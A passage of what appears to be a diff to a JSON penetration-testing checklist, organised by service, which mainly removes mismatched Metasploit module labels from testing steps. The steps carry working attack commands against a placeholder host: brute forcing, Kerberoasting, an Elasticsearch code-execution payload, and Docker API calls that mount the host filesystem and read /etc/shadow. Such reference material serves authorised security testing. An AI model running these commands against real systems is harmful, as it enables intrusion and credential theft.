@@ -17,8 +17,8 @@
       "Alternative Metasploit Module: auxiliary/scanner/ftp/anonymous - Check for anonymous login: `ftp target.com` (user: anonymous, pass: anonymous)",
       "Alternative Metasploit Module: auxiliary/scanner/ftp/ftp_login - Attempt brute force: `hydra -L users.txt -P pass.txt ftp://target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/portscan/ftpbounce - Check for FTP bounce attack: `nmap -b anonymous:anonymous@target.com otherserver.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/ftp/ftp_version - Look for sensitive data in FTP directories",
-      "Alternative Metasploit Module: auxiliary/scanner/ftp/pcman_ftp_traversal - Test for directory traversal using \"../\" sequences"
+      "Look for sensitive data in FTP directories",
+      "Test for directory traversal using \"../\" sequences"
     ],
     "tools": [
       "Nmap FTP scripts",
@@ -47,8 +47,8 @@
       "Check for weak ciphers: `nmap --script ssh2-enum-algos target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/ssh/ssh_login - Attempt brute force: `hydra -L users.txt -P pass.txt ssh://target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/ssh/ssh_enumusers - Test for user enumeration: `metasploit auxiliary/scanner/ssh/ssh_enumusers`",
-      "Alternative Metasploit Module: post/linux/manage/sshkey_persistence - Check for authorized_keys file permissions",
-      "Alternative Metasploit Module: auxiliary/scanner/ssh/ssh_version - Look for CVEs for specific SSH versions"
+      "Check for authorized_keys file permissions",
+      "Look for CVEs for specific SSH versions"
     ],
     "tools": [
       "Nmap SSH scripts",
@@ -73,8 +73,8 @@
     ],
     "testing": [
       "Connect manually: `telnet target.com 23`",
-      "Alternative Metasploit Module: auxiliary/server/capture/telnet - Sniff credentials: `tcpdump -i eth0 -nn port 23 -w telnet.pcap`",
-      "Alternative Metasploit Module: auxiliary/scanner/telnet/telnet_encrypt_overflow - Check for authentication bypass",
+      "Sniff credentials: `tcpdump -i eth0 -nn port 23 -w telnet.pcap`",
+      "Check for authentication bypass",
       "Alternative Metasploit Module: auxiliary/scanner/telnet/telnet_login - Attempt brute force: `hydra -L users.txt -P pass.txt telnet://target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/telnet/telnet_version - Look for information leakage in banners"
     ],
@@ -103,9 +103,9 @@
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/smtp/smtp_relay - Test for open relay: `telnet target.com 25`",
       "Alternative Metasploit Module: auxiliary/scanner/smtp/smtp_enum - User enumeration: `VRFY admin` or `EXPN admin`",
-      "Alternative Metasploit Module: auxiliary/scanner/smtp/smtp_enum - Attempt to enumerate users with tools",
-      "Alternative Metasploit Module: auxiliary/scanner/smtp/smtp_ntlm_domain - Check for cleartext auth: `nmap --script smtp-commands target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/smtp/smtp_version - Test for SMTP command injection"
+      "Attempt to enumerate users with tools",
+      "Check for cleartext auth: `nmap --script smtp-commands target.com`",
+      "Test for SMTP command injection"
     ],
     "tools": [
       "Nmap SMTP scripts",
@@ -134,7 +134,7 @@
       "Alternative Metasploit Module: auxiliary/gather/enum_dns - DNS enumeration: `dnsrecon -d domain.com`",
       "Alternative Metasploit Module: auxiliary/gather/enum_dns - Subdomain discovery: `dnsenum domain.com`",
       "Alternative Metasploit Module: auxiliary/gather/enum_dns - Check for DNSSEC misconfiguration",
-      "Alternative Metasploit Module: auxiliary/server/dns/native_server - Test for cache poisoning vulnerabilities"
+      "Test for cache poisoning vulnerabilities"
     ],
     "tools": [
       "dig",
@@ -188,13 +188,13 @@
       "SSL/TLS issues"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/scanner/http/http_version - Web application scanning: `nikto -h target.com`",
+      "Web application scanning: `nikto -h target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/http/dir_scanner - Directory brute-force: `gobuster dir -u target.com -w wordlist.txt`",
       "Alternative Metasploit Module: auxiliary/scanner/http/ssl - Check for SSL issues: `sslscan target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/http/http_login - Test for SQL injection: `sqlmap -u \"https://target.com/page.php?id=1\"`",
+      "Test for SQL injection: `sqlmap -u \"https://target.com/page.php?id=1\"`",
       "Alternative Metasploit Module: auxiliary/scanner/http/files_dir - Look for sensitive data in source code",
       "Alternative Metasploit Module: auxiliary/scanner/http/http_login - Check for default credentials",
-      "Alternative Metasploit Module: auxiliary/scanner/http/http_header - Analyze HTTP headers and cookies"
+      "Analyze HTTP headers and cookies"
     ],
     "tools": [
       "Burp Suite",
@@ -221,9 +221,9 @@
     ],
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/pop3/pop3_version - Connect manually: `telnet target.com 110`",
-      "Alternative Metasploit Module: auxiliary/server/capture/pop3 - Check for cleartext auth: `USER username` followed by `PASS password`",
+      "Check for cleartext auth: `USER username` followed by `PASS password`",
       "Alternative Metasploit Module: auxiliary/scanner/pop3/pop3_login - Attempt brute force: `hydra -l user -P passwords.txt pop3://target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/pop3/pop3_version - Test SSL/TLS (for POP3S): `openssl s_client -connect target.com:995`"
+      "Test SSL/TLS (for POP3S): `openssl s_client -connect target.com:995`"
     ],
     "tools": [
       "Nmap POP3 scripts",
@@ -248,9 +248,9 @@
     ],
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/imap/imap_version - Connect manually: `telnet target.com 143`",
-      "Alternative Metasploit Module: auxiliary/server/capture/imap - Login attempt: `a LOGIN username password`",
-      "Alternative Metasploit Module: auxiliary/scanner/imap/imap_login - Attempt brute force: `hydra -l user -P passwords.txt imap://target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/imap/imap_version - Check SSL/TLS (for IMAPS): `openssl s_client -connect target.com:993`",
+      "Login attempt: `a LOGIN username password`",
+      "Attempt brute force: `hydra -l user -P passwords.txt imap://target.com`",
+      "Check SSL/TLS (for IMAPS): `openssl s_client -connect target.com:993`",
       "Alternative Metasploit Module: auxiliary/scanner/imap/imap_version - List mailboxes: `a LIST \"\" *`"
     ],
     "tools": [
@@ -278,7 +278,7 @@
       "Alternative Metasploit Module: auxiliary/scanner/dcerpc/endpoint_mapper - Enumerate RPC endpoints: `rpcdump.py target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/dcerpc/hidden - Check for null sessions: `rpcclient -U \"\" -N target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/dcerpc/tcp_dcerpc_auditor - Scan for RPC vulnerabilities: `nmap -sV -p 135 --script=msrpc-enum target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/dcerpc/management - Attempt to exploit known RPC CVEs based on version"
+      "Attempt to exploit known RPC CVEs based on version"
     ],
     "tools": [
       "Impacket suite (rpcdump.py)",
@@ -365,8 +365,8 @@
       "Alternative Metasploit Module: auxiliary/gather/ldap_query - Check for anonymous binding: `ldapsearch -x -H ldap://target.com -b \"dc=domain,dc=com\"`",
       "Alternative Metasploit Module: auxiliary/gather/ldap_query - Enumerate users: `ldapsearch -x -H ldap://target.com -b \"dc=domain,dc=com\" \"objectClass=user\"`",
       "Alternative Metasploit Module: auxiliary/gather/ldap_hashdump - Look for sensitive data in LDAP directory",
-      "Alternative Metasploit Module: auxiliary/gather/ldap_query - Test for LDAP injection in web applications",
-      "Alternative Metasploit Module: auxiliary/gather/ldap_query - Attempt brute force: `nmap --script ldap-brute target.com`"
+      "Test for LDAP injection in web applications",
+      "Attempt brute force: `nmap --script ldap-brute target.com`"
     ],
     "tools": [
       "ldapsearch",
@@ -392,11 +392,11 @@
       "MIB enumeration"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/scanner/snmp/snmp_login - Scan for SNMP: `nmap -sU -p 161 target.com/24`",
+      "Scan for SNMP: `nmap -sU -p 161 target.com/24`",
       "Alternative Metasploit Module: auxiliary/scanner/snmp/snmp_login - Community string brute force: `onesixtyone -c community.txt target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/snmp/snmp_enum - Walk the MIB tree: `snmpwalk -v2c -c public target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/snmp/snmp_enum - Enumerate users: `snmpwalk -v2c -c public target.com 1.3.6.1.4.1.77.1.2.25`",
-      "Alternative Metasploit Module: auxiliary/scanner/snmp/snmp_set - Check for writeable OIDs: `snmpset`"
+      "Check for writeable OIDs: `snmpset`"
     ],
     "tools": [
       "onesixtyone",
@@ -423,8 +423,8 @@
     ],
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/rdp/rdp_scanner - Scan for RDP: `nmap -p 3389 --script rdp-ntlm-info target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/rdp/ms12_020_check - Check for BlueKeep: `nmap --script rdp-vuln-ms12-020 target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/rdp/rdp_scanner - Test for NLA: `ncrack -vv --user administrator -P passwords.txt rdp://target.com`",
+      "Check for BlueKeep: `nmap --script rdp-vuln-ms12-020 target.com`",
+      "Test for NLA: `ncrack -vv --user administrator -P passwords.txt rdp://target.com`",
       "Attempt brute force: `hydra -l administrator -P passwords.txt rdp://target.com`"
     ],
     "tools": [
@@ -454,7 +454,7 @@
       "Alternative Metasploit Module: auxiliary/scanner/vnc/vnc_none_auth - Scan for VNC: `nmap -p 5900 --script vnc-info target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/vnc/vnc_none_auth - Check for no auth: `vncviewer target.com:5900`",
       "Alternative Metasploit Module: auxiliary/scanner/vnc/vnc_login - Attempt brute force: `hydra -P passwords.txt vnc://target.com`",
-      "Alternative Metasploit Module: post/windows/gather/credentials/vnc - Look for VNC password files on compromised systems"
+      "Look for VNC password files on compromised systems"
     ],
     "tools": [
       "Nmap VNC scripts",
@@ -508,7 +508,7 @@
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/nfs/nfsmount - Enumerate NFS shares: `showmount -e target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/nfs/nfsmount - Mount NFS share: `mount -t nfs target.com:/share /mnt/nfs`",
-      "Alternative Metasploit Module: post/linux/gather/enum_configs - Check file permissions on mounted share",
+      "Check file permissions on mounted share",
       "Alternative Metasploit Module: auxiliary/scanner/nfs/nfsmount - Look for sensitive files & user data",
       "Alternative Metasploit Module: auxiliary/scanner/nfs/nfsmount - Check no_root_squash misconfiguration"
     ],
@@ -537,7 +537,7 @@
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/mysql/mysql_version - Connect to MySQL: `mysql -h target.com -u root -p`",
       "Alternative Metasploit Module: auxiliary/admin/mysql/mysql_enum - Enumerate MySQL users: `SELECT user,host,password FROM mysql.user;`",
-      "Alternative Metasploit Module: auxiliary/scanner/mysql/mysql_authbypass_hashdump - Check for SQL injection in web apps",
+      "Check for SQL injection in web apps",
       "Alternative Metasploit Module: auxiliary/scanner/mysql/mysql_login - Attempt brute force: `hydra -l root -P passwords.txt mysql://target.com`",
       "Alternative Metasploit Module: exploit/multi/mysql/mysql_udf_payload - Look for MySQL UDFs for privilege escalation"
     ],
@@ -598,7 +598,7 @@
       "Alternative Metasploit Module: auxiliary/scanner/mongodb/mongodb_login - Check for authentication: try commands without auth",
       "Alternative Metasploit Module: auxiliary/scanner/mongodb/mongodb_login - List databases: `show dbs`",
       "Alternative Metasploit Module: auxiliary/scanner/mongodb/mongodb_login - Enumerate collections: `show collections`",
-      "Alternative Metasploit Module: auxiliary/gather/mongodb_js_inject_collection_enum - Check for NoSQL injection in web applications",
+      "Check for NoSQL injection in web applications",
       "Alternative Metasploit Module: auxiliary/scanner/mongodb/mongodb_login - Extract data: `db.collection.find()`"
     ],
     "tools": [
@@ -685,10 +685,10 @@
       "Improper implementation"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/admin/kerberos/ms14_068_kerberos_checksum - Enumerate users: `kerbrute userenum -d domain.com users.txt`",
+      "Enumerate users: `kerbrute userenum -d domain.com users.txt`",
       "Alternative Metasploit Module: auxiliary/gather/kerberos_enumusers - Kerberoasting: `GetUserSPNs.py domain.com/user:password -request`",
       "Alternative Metasploit Module: auxiliary/gather/kerberos_enumusers - AS-REP Roasting: `GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat`",
-      "Alternative Metasploit Module: auxiliary/admin/kerberos/ms14_068_kerberos_checksum - Check for overly permissive delegation",
+      "Check for overly permissive delegation",
       "Alternative Metasploit Module: auxiliary/scanner/kerberos/kerberos_login - Test for password spraying: `kerbrute passwordspray -d domain.com users.txt password`"
     ],
     "tools": [
@@ -776,9 +776,9 @@
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/sip/options - Scan for SIP: `nmap -sU -p 5060 --script sip-methods target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/sip/enumerator - Enumerate SIP extensions: `svmap target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/sip/options_tcp - Attempt brute force: `svcrack -u100 -d dictionary.txt target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/sip/options - Intercept SIP traffic with Wireshark",
-      "Alternative Metasploit Module: auxiliary/scanner/sip/options - Test for unauthorized access to SIP trunks"
+      "Attempt brute force: `svcrack -u100 -d dictionary.txt target.com`",
+      "Intercept SIP traffic with Wireshark",
+      "Test for unauthorized access to SIP trunks"
     ],
     "tools": [
       "SIPVicious suite (svmap, svwar, svcrack)",
@@ -959,7 +959,7 @@
       "Alternative Metasploit Module: auxiliary/scanner/elasticsearch/indices_enum - Check for unauthenticated access: `curl http://target.com:9200/`",
       "Alternative Metasploit Module: auxiliary/scanner/elasticsearch/indices_enum - List all indices: `curl http://target.com:9200/_cat/indices`",
       "Alternative Metasploit Module: auxiliary/scanner/elasticsearch/indices_enum - Query sensitive data: `curl http://target.com:9200/_search?q=password`",
-      "Alternative Metasploit Module: auxiliary/scanner/elasticsearch/indices_enum - Check for RCE via scripts: `curl -X POST \"http://target.com:9200/_search\" -d '{\"script_fields\": {\"exploit\": {\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"},},},' -H 'Content-Type: application/json'`",
+      "Check for RCE via scripts: `curl -X POST \"http://target.com:9200/_search\" -d '{\"script_fields\": {\"exploit\": {\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"},},},' -H 'Content-Type: application/json'`",
       "Alternative Metasploit Module: auxiliary/scanner/elasticsearch/indices_enum - Look for cluster information: `curl http://target.com:9200/_cluster/health`"
     ],
     "tools": [
@@ -987,10 +987,10 @@
     ],
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/http/docker_version - Check for unauthenticated API: `curl http://target.com:2375/version`",
-      "Alternative Metasploit Module: auxiliary/scanner/http/docker_version - List containers: `curl http://target.com:2375/containers/json`",
-      "Alternative Metasploit Module: auxiliary/scanner/http/docker_version - Create privileged container: `curl -X POST -H \"Content-Type: application/json\" http://target.com:2375/containers/create -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/host\"], \"Privileged\": true},'`",
-      "Alternative Metasploit Module: auxiliary/scanner/http/docker_version - Execute commands: `curl -X POST http://target.com:2375/containers/[ID]/exec -d '{\"Cmd\":[\"cat\", \"/etc/shadow\"], \"AttachStdout\": true},'`",
-      "Alternative Metasploit Module: auxiliary/scanner/http/docker_version - Look for exposed Docker socket in web apps: `/var/run/docker.sock`"
+      "List containers: `curl http://target.com:2375/containers/json`",
+      "Create privileged container: `curl -X POST -H \"Content-Type: application/json\" http://target.com:2375/containers/create -d '{\"Image\":\"alpine\",\"Cmd\":[\"/bin/sh\"],\"Binds\":[\"/:/host\"], \"Privileged\": true},'`",
+      "Execute commands: `curl -X POST http://target.com:2375/containers/[ID]/exec -d '{\"Cmd\":[\"cat\", \"/etc/shadow\"], \"AttachStdout\": true},'`",
+      "Look for exposed Docker socket in web apps: `/var/run/docker.sock`"
     ],
     "tools": [
       "curl",
@@ -1052,7 +1052,7 @@
       "Alternative Metasploit Module: auxiliary/scanner/ipmi/ipmi_cipher_zero - Try cipher zero auth: `ipmitool -I lanplus -H target.com -U admin -P admin -C 0 user list`",
       "Alternative Metasploit Module: auxiliary/scanner/ipmi/ipmi_dumphashes - Attempt to dump hashes: `ipmitool -I lanplus -H target.com -U admin -P admin user list`",
       "Check for default credentials",
-      "Alternative Metasploit Module: auxiliary/scanner/ipmi/ipmi_version - Test for known CVEs based on BMC version"
+      "Test for known CVEs based on BMC version"
     ],
     "tools": [
       "ipmitool",
@@ -1082,7 +1082,7 @@
       "Alternative Metasploit Module: auxiliary/scanner/winrm/winrm_login - Test credentials: `evil-winrm -i target.com -u administrator -p password`",
       "Alternative Metasploit Module: auxiliary/scanner/winrm/winrm_login - Attempt brute force: `crackmapexec winrm target.com -u users.txt -p passwords.txt`",
       "Alternative Metasploit Module: auxiliary/scanner/winrm/winrm_auth_methods - Check for HTTP/unencrypted WinRM: `-p 5985`",
-      "Alternative Metasploit Module: auxiliary/scanner/winrm/winrm_cmd - Try known exploits for the identified WinRM version"
+      "Try known exploits for the identified WinRM version"
     ],
     "tools": [
       "evil-winrm",
@@ -1170,11 +1170,11 @@
     ],
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/smtp/smtp_version - Connect to SMTP: `telnet target.com 587`",
-      "Alternative Metasploit Module: auxiliary/scanner/smtp/smtp_ntlm_domain - Test for STARTTLS: `STARTTLS`",
+      "Test for STARTTLS: `STARTTLS`",
       "Alternative Metasploit Module: auxiliary/scanner/smtp/smtp_enum - Check for enumeration: `VRFY admin` or `EXPN admin`",
       "Alternative Metasploit Module: auxiliary/scanner/smtp/smtp_relay - Attempt to relay: Send email from non-local domain",
       "Alternative Metasploit Module: auxiliary/scanner/smtp/smtp_version - Look for version info in banner",
-      "Alternative Metasploit Module: auxiliary/scanner/smtp/smtp_ntlm_domain - Test for authentication bypass"
+      "Test for authentication bypass"
     ],
     "tools": [
       "telnet/nc",
@@ -1726,7 +1726,7 @@
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/sap/sap_service_discovery - Access web interface: `http://target.com:8000/`",
       "Alternative Metasploit Module: auxiliary/scanner/sap/sap_service_discovery - Check for SMDAgents: `http://target.com:8000/sap/monitoring/`",
-      "Alternative Metasploit Module: auxiliary/scanner/sap/sap_router_info_request - Test default accounts: `SAP*`, `DDIC`, etc.",
+      "Test default accounts: `SAP*`, `DDIC`, etc.",
       "Alternative Metasploit Module: auxiliary/scanner/sap/sap_icm_urlscan - Scan for ICM vulnerabilities",
       "Alternative Metasploit Module: auxiliary/scanner/sap/sap_rfc_client_enumerate - Look for exposed RFC interfaces",
       "Alternative Metasploit Module: auxiliary/scanner/sap/sap_router_portscanner - Check for gateway security issues"
@@ -1755,12 +1755,12 @@
       "Remote code execution"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/scanner/mssql/mssql_ping - Check for MSMQ service: `nmap -p 1801 target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/mssql/mssql_ping - Connect to MSMQ: `net use \\\\target.com\\private$\\queue`",
-      "Alternative Metasploit Module: auxiliary/scanner/mssql/mssql_ping - Enumerate queues: `msmqutil `",
-      "Alternative Metasploit Module: auxiliary/scanner/mssql/mssql_ping - Check message contents",
-      "Alternative Metasploit Module: auxiliary/scanner/mssql/mssql_ping - Test for remote queue creation",
-      "Alternative Metasploit Module: auxiliary/scanner/mssql/mssql_ping - Look for excessive permissions"
+      "Check for MSMQ service: `nmap -p 1801 target.com`",
+      "Connect to MSMQ: `net use \\\\target.com\\private$\\queue`",
+      "Enumerate queues: `msmqutil `",
+      "Check message contents",
+      "Test for remote queue creation",
+      "Look for excessive permissions"
     ],
     "tools": [
       "msmqutil",
@@ -1786,12 +1786,12 @@
       "BGP session hijacking"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/scanner/tcp/port - Scan for BGP: `nmap -p 179 target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/tcp/port - Check for bogus routes acceptance",
-      "Alternative Metasploit Module: auxiliary/scanner/tcp/port - Test for peer authentication",
-      "Alternative Metasploit Module: auxiliary/scanner/tcp/port - Look for route filtering issues",
-      "Alternative Metasploit Module: auxiliary/scanner/tcp/port - Attempt valid BGP announcements",
-      "Alternative Metasploit Module: auxiliary/scanner/tcp/port - Test for maximum prefix limits"
+      "Scan for BGP: `nmap -p 179 target.com`",
+      "Check for bogus routes acceptance",
+      "Test for peer authentication",
+      "Look for route filtering issues",
+      "Attempt valid BGP announcements",
+      "Test for maximum prefix limits"
     ],
     "tools": [
       "quagga",
@@ -1820,9 +1820,9 @@
       "Alternative Metasploit Module: auxiliary/scanner/http/http_login - Connect to OMSA: `https://target.com:1311/`",
       "Alternative Metasploit Module: auxiliary/scanner/http/http_login - Check for default credentials: `username: root, password: calvin`",
       "Alternative Metasploit Module: auxiliary/scanner/http/http_version - Look for sensitive information in web interface",
-      "Alternative Metasploit Module: auxiliary/scanner/http/http_version - Test for command execution in diagnostic features",
-      "Alternative Metasploit Module: auxiliary/scanner/http/http_login - Check for authentication bypass vulnerabilities",
-      "Alternative Metasploit Module: auxiliary/scanner/http/http_version - Scan for known CVEs in reported version"
+      "Test for command execution in diagnostic features",
+      "Check for authentication bypass vulnerabilities",
+      "Scan for known CVEs in reported version"
     ],
     "tools": [
       "curl",
@@ -1851,8 +1851,8 @@
       "Alternative Metasploit Module: auxiliary/scanner/vmware/esx_fingerprint - Access ESXi web interface: `https://target.com/`",
       "Alternative Metasploit Module: auxiliary/scanner/vmware/vmware_http_login - Test default credentials: `root:vmware`",
       "Alternative Metasploit Module: auxiliary/scanner/vmware/esx_fingerprint - Check for ESXi version and patch level",
-      "Alternative Metasploit Module: auxiliary/scanner/vmware/esx_fingerprint - Look for known CVEs based on version",
-      "Alternative Metasploit Module: auxiliary/scanner/vmware/vmware_http_login - Test for authentication bypass vulnerabilities",
+      "Look for known CVEs based on version",
+      "Test for authentication bypass vulnerabilities",
       "Alternative Metasploit Module: auxiliary/scanner/vmware/vmware_http_login - Attempt VM console access"
     ],
     "tools": [
@@ -1882,9 +1882,9 @@
       "Alternative Metasploit Module: auxiliary/scanner/vmware/vmware_http_login - Access vCenter: `https://target.com/`",
       "Alternative Metasploit Module: auxiliary/scanner/vmware/vmware_http_login - Test default credentials: `administrator@vsphere.local:vmware`",
       "Alternative Metasploit Module: auxiliary/scanner/vmware/vmware_http_login - Check for vCenter version and patch level",
-      "Alternative Metasploit Module: auxiliary/scanner/vmware/esx_fingerprint - Look for known CVEs based on version",
-      "Alternative Metasploit Module: auxiliary/scanner/vmware/vmware_http_login - Test for authentication bypass vulnerabilities",
-      "Alternative Metasploit Module: auxiliary/scanner/vmware/vmware_http_login - Attempt SSRF through vCenter interfaces"
+      "Look for known CVEs based on version",
+      "Test for authentication bypass vulnerabilities",
+      "Attempt SSRF through vCenter interfaces"
     ],
     "tools": [
       "curl",
@@ -1916,7 +1916,7 @@
       "Alternative Metasploit Module: auxiliary/gather/kerberos_enumusers - Kerberoasting: `GetUserSPNs.py domain.com/user:password -request`",
       "Alternative Metasploit Module: auxiliary/gather/kerberos_enumusers - AS-REP Roasting: `GetNPUsers.py domain.com/ -usersfile users.txt -format hashcat`",
       "Alternative Metasploit Module: auxiliary/gather/ldap_query - Check for LDAP signing and channel binding",
-      "Alternative Metasploit Module: auxiliary/admin/dcerpc/cve_2021_1675_printnightmare - Test for DCSync permissions"
+      "Test for DCSync permissions"
     ],
     "tools": [
       "Bloodhound",
@@ -1943,7 +1943,7 @@
       "Insecure defaults"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/gather/mongodb_js_inject_collection_enum - Test for NoSQL injection in web apps",
+      "Test for NoSQL injection in web apps",
       "Alternative Metasploit Module: auxiliary/scanner/mongodb/mongodb_login - Check for exposed database interfaces",
       "Alternative Metasploit Module: auxiliary/scanner/mongodb/mongodb_login - Attempt unauthenticated access",
       "Alternative Metasploit Module: auxiliary/scanner/mongodb/mongodb_login - Look for default credentials",
@@ -1980,7 +1980,7 @@
       "Alternative Metasploit Module: auxiliary/scanner/http/git_scanner - Look for exposed keys in public repositories",
       "Alternative Metasploit Module: auxiliary/scanner/aws/aws_enum_iam - Scan for weak IAM policies",
       "Alternative Metasploit Module: auxiliary/scanner/aws/rds_instance_enumeration - Check for public RDS instances",
-      "Alternative Metasploit Module: auxiliary/scanner/http/http_login - Test API Gateway endpoints"
+      "Test API Gateway endpoints"
     ],
     "tools": [
       "AWS CLI",
@@ -2007,12 +2007,12 @@
       "Function app vulnerabilities"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/scanner/http/http_login - Check for public blob storage: `az storage blob list --account-name accountname --container-name containername --auth-mode login`",
-      "Alternative Metasploit Module: auxiliary/scanner/http/http_login - Test for unauthenticated function apps",
-      "Alternative Metasploit Module: auxiliary/scanner/http/http_login - Look for excessive permissions in service principals",
-      "Alternative Metasploit Module: auxiliary/scanner/http/http_login - Scan for misconfigured key vaults",
+      "Check for public blob storage: `az storage blob list --account-name accountname --container-name containername --auth-mode login`",
+      "Test for unauthenticated function apps",
+      "Look for excessive permissions in service principals",
+      "Scan for misconfigured key vaults",
       "Alternative Metasploit Module: auxiliary/scanner/mssql/mssql_login - Check for public Azure SQL databases",
-      "Alternative Metasploit Module: auxiliary/scanner/http/http_login - Test Azure AD configuration"
+      "Test Azure AD configuration"
     ],
     "tools": [
       "Azure CLI",
@@ -2038,11 +2038,11 @@
       "Legacy service with minimal security"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/scanner/tcp/tcp_connect - Connect using netcat: `nc target.com 7`",
-      "Alternative Metasploit Module: auxiliary/scanner/tcp/tcp_connect - Send data and verify it echoes back",
-      "Alternative Metasploit Module: auxiliary/scanner/tcp/tcp_connect - Check for response data leakage",
-      "Alternative Metasploit Module: auxiliary/scanner/tcp/tcp_connect - Attempt to use for network scanning techniques",
-      "Alternative Metasploit Module: auxiliary/scanner/tcp/tcp_connect - Test for DoS conditions via repeated connections"
+      "Connect using netcat: `nc target.com 7`",
+      "Send data and verify it echoes back",
+      "Check for response data leakage",
+      "Attempt to use for network scanning techniques",
+      "Test for DoS conditions via repeated connections"
     ],
     "tools": [
       "netcat/nc",
@@ -2066,7 +2066,7 @@
       "Access to sensitive application data"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/scanner/tcp/port - Scan for JDWP ports: `nmap -sT -p- target.com`",
+      "Scan for JDWP ports: `nmap -sT -p- target.com`",
       "Alternative Metasploit Module: exploit/multi/misc/java_jdwp_debugger - Test for unauthenticated access: `jdb -attach target.com:port`",
       "Alternative Metasploit Module: exploit/multi/misc/java_jdwp_debugger - Attempt remote code execution: `jdwp-shellifier.py -t target.com -p port`",
       "Alternative Metasploit Module: exploit/multi/misc/java_jdwp_debugger - Extract sensitive information from memory",
@@ -2182,10 +2182,10 @@
     ],
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/dcerpc/endpoint_mapper - List RPC services: `rpcinfo -p target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/dcerpc/endpoint_mapper - Dump RPC statistics: `rpcinfo -s target.com`",
+      "List RPC services: `rpcinfo -s target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/dcerpc/tcp_dcerpc_auditor - Scan for RPC vulnerabilities: `nmap -sV -p 111 --script=rpc* target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/dcerpc/hidden - Check for null sessions and unauthorized access",
-      "Alternative Metasploit Module: auxiliary/scanner/dcerpc/tcp_dcerpc_auditor - Test for portmap amplification attack potential"
+      "Test for portmap amplification attack potential"
     ],
     "tools": [
       "rpcinfo",
@@ -2240,9 +2240,9 @@
     "testing": [
       "Alternative Metasploit Module: auxiliary/scanner/ntp/ntp_peers - Query NTP server: `ntpq -c peers target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/ntp/ntp_monlist - Check for monlist: `ntpdc -n -c monlist target.com`",
-      "Alternative Metasploit Module: auxiliary/scanner/ntp/ntp_peer_list_dos - Test for NTP version: `nmap -sU -p 123 --script ntp-info target.com`",
+      "Test for NTP version: `nmap -sU -p 123 --script ntp-info target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/ntp/ntp_monlist - Check for NTP amplification potential",
-      "Alternative Metasploit Module: auxiliary/scanner/ntp/ntp_peer_list_dos - Test for authentication bypass"
+      "Test for authentication bypass"
     ],
     "tools": [
       "ntpq",
@@ -2267,7 +2267,7 @@
       "Authentication bypass issues"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/scanner/portscan/tcp - Identify Check Point services: `nmap -p 264 target.com`",
+      "Identify Check Point services: `nmap -p 264 target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/http/http_version - Test for information disclosure",
       "Alternative Metasploit Module: auxiliary/scanner/http/http_login - Check for management interface access",
       "Alternative Metasploit Module: auxiliary/scanner/http/http_version - Attempt to determine firewall version",
@@ -2409,7 +2409,7 @@
       "Format string vulnerabilities"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/scanner/printer/printer_version_info - Connect to LPD: `nc target.com 515`",
+      "Connect to LPD: `nc target.com 515`",
       "Alternative Metasploit Module: auxiliary/scanner/printer/printer_list_dir - List printer queues: `lpq -P printer_name -h target.com`",
       "Alternative Metasploit Module: auxiliary/scanner/printer/printer_list_dir - Submit test print job: `lpr -P printer_name -h target.com file.txt`",
       "Alternative Metasploit Module: auxiliary/scanner/printer/printer_list_dir - Attempt to view other print jobs",
@@ -2493,11 +2493,11 @@
       "RPC vulnerabilities"
     ],
     "testing": [
-      "Alternative Metasploit Module: auxiliary/scanner/misc/sunrpc_portmapper - Query users: `rusers target.com`",
